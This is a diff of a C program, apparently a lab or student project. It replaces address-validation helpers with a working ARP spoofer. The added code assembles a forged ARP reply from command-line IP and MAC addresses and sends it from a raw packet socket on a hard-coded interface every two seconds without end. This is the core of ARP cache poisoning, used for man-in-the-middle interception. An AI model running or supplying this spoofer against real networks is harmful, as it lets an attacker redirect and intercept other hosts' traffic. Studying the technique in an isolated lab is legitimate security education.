@@ -1,81 +1,78 @@
-#include <stdio.h>  // sscanf
-#include <string.h> // strlen
-#include <stdbool.h>
-#include <stdlib.h> // exit
-#include <ctype.h>  // isdigit
+#include <stdio.h>  // sscanf, printf, fprintf
+#include <string.h> // memcpy
+#include <stdlib.h>
 
-bool is_valid_mac(const char *str)
-{
-    if (strlen(str) != 17)
-        return (fprintf(stderr, "invalid MAC address format: %s\n", str), false);
-    for (int i = 0; str[i]; i++)
-    {
-        if ((i - 2) % 3 == 0 ? str[i] != ':' : !isxdigit(str[i]))
-            return (fprintf(stderr, "invalid MAC address format: %s\n", str), false);
-    }
-    return true;
-}
+#include "network_types.h"
+#include "print_func.h"
+#include "constants.h"
+#include "parsing.h"
 
-bool is_valid_ipv4(const char *ip)
-{
+const unsigned char ETH_TYPE_ARP[2] = {0x08, 0x06};
+const unsigned char PROTCOL_TYPE_IPv4[2] = {0x08, 0x00};
+const unsigned char HW_ETHERNET[2] = {0x00, 0x01};
+const unsigned char OPCODE_REPLY[2] = {0x00, 0x02};
+const unsigned char MAC_SIZE = 6;
+const unsigned char IP_SIZE = 4;
 
-    if (strlen(ip) < 7 || strlen(ip) > 15)
-        return (fprintf(stderr, "invalid IP address format: %s\n", ip), false);
+unsigned char buff[60] = {0};
 
-    int a, b, c, d;
-    char extra;
+//----------------------------------------------------------
+#include <sys/socket.h>
+#include <netpacket/packet.h>
+#include <net/ethernet.h> /* protocoles L2 */
+#include <arpa/inet.h>
+#include <errno.h>
+#include <net/if.h>
+ #include <unistd.h>
 
-   
-    int n = sscanf(ip, "%d.%d.%d.%d%c", &a, &b, &c, &d, &extra);
+//--------------------------------------------------------
 
-   
-    if (n != 4)
-        return (fprintf(stderr, "invalid IP address format: %s\n", ip), false);
+#include <stdio.h>
+#include <stdint.h>
 
-    
-    if (a < 0 || a > 255) return (fprintf(stderr, "invalid IP address format: %s\n", ip), false);
-    if (b < 0 || b > 255) return (fprintf(stderr, "invalid IP address format: %s\n", ip), false);
-    if (c < 0 || c > 255) return (fprintf(stderr, "invalid IP address format: %s\n", ip), false);
-    if (d < 0 || d > 255) return (fprintf(stderr, "invalid IP address format: %s\n", ip), false);
 
-    return true;
-
-}
-void parse_args(char **argv)
-{
-
-    if (!is_valid_ipv4(argv[1]) ||
-        !is_valid_mac(argv[2]) ||
-        !is_valid_ipv4(argv[3]) ||
-        !is_valid_mac(argv[4]))
-    {
-        exit(1);
-    }
-}
-
-// void mac_str_to_bin(const char *mac_str)
-// {
-
-//     return 0;
-// }
 
 int main(int argc, char **argv)
 {
     if (argc != 5)
         return (fprintf(stderr, "The program must have 4 arguments\n"));
-    (void)argv;
-    // parse_args(argv);
-    // unsigned char binary_mac_target[6];
-    // unsigned char binary_mac_src[6];
-    char str[] = "08:00:27:26:c0:0c";
-    char strip[] = "192.168.56.10";
-    is_valid_ipv4(strip);
-    unsigned int a, b, c, d, e, f;
 
-    int n = sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x", &a, &b, &c, &d, &e, &f);
-    if (n < 6)
-        return 1;
-    printf("%02x %02x %02x %02x %02x %02x\n", a, b, c, d, e, f);
-    printf("%u %u %u %u %u %u\n", a, b, c, d, e, f);
+    t_network_data nwdata = {0};
+
+    parse_args(argv, &nwdata);
+    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if (s == -1)
+        return (fprintf(stderr, "socket failed: %s\n", strerror(errno)));
+    memcpy(buff, nwdata.mac_dst, MAC_SIZE);
+    memcpy(&buff[MAC_SIZE], nwdata.mac_local, MAC_SIZE);
+    memcpy(&buff[MAC_SIZE * 2], ETH_TYPE_ARP, 2);
+    memcpy(&buff[14], HW_ETHERNET, 2);
+    memcpy(&buff[16], PROTCOL_TYPE_IPv4, 2);
+    buff[18] = MAC_SIZE;
+    buff[19] = IP_SIZE;
+    memcpy(&buff[20], OPCODE_REPLY, 2);
+    memcpy(&buff[22], nwdata.mac_local, MAC_SIZE);
+    memcpy(&buff[28], nwdata.ip_src, IP_SIZE);
+    memcpy(&buff[32], nwdata.mac_dst, MAC_SIZE);
+    memcpy(&buff[38], nwdata.ip_dst, IP_SIZE);
+    print_arp_frame(buff);
+    //-----------------------------------------------------
+    unsigned int ifindex = if_nametoindex("enp0s8");
+    if (ifindex == 0)
+    {
+        perror("if_nametoindex");
+        exit(1);
+    }
+    struct sockaddr_ll addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sll_family = AF_PACKET;
+    addr.sll_ifindex = ifindex;
+    addr.sll_halen = ETH_ALEN;
+    memcpy(addr.sll_addr, nwdata.mac_dst, 6);
+    //----------------------------------------------------------------------
+    while (1){
+        sendto(s, buff, 60, 0, (struct sockaddr *)&addr, sizeof(addr));
+        sleep(2);
+    }
     return 0;
 }
